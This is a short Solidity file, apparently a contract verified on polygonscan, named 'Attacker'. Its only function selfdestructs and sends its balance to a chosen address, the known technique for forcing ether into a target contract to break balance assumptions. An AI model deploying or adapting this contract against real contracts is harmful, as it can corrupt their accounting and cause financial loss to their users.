/**
 *Submitted for verification at polygonscan.com on 2022-12-21
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.6.12;

contract Attacker {

    function withdraw(address payable addr) public payable {
        selfdestruct(addr);
    }
}